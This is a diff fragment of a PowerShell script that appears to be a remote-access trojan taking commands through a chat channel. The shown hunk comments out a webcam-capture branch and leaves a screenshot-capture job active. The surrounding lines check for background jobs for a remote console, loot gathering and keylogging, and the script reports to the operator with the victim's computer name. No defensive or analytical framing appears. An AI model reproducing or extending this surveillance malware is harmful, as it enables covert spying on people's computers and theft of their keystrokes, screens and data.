@@ -1625,13 +1625,13 @@ while ($true) {
         $PSrunning = Get-Job -Name PSconsole
         $lootrunning = Get-Job -Name Info
         $keysrunning = Get-Job -Name Keys
-        if ($messages -eq 'webcam'){
-            if (!($camrunning)){
-            #    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
-                sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
-            }
-            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
-        }
+#        if ($messages -eq 'webcam'){
+#            if (!($camrunning)){
+#            #    Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
+#                sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
+#            }
+#            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
+#        }
         if ($messages -eq 'screenshots'){
             if (!($sceenrunning)){
                 Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
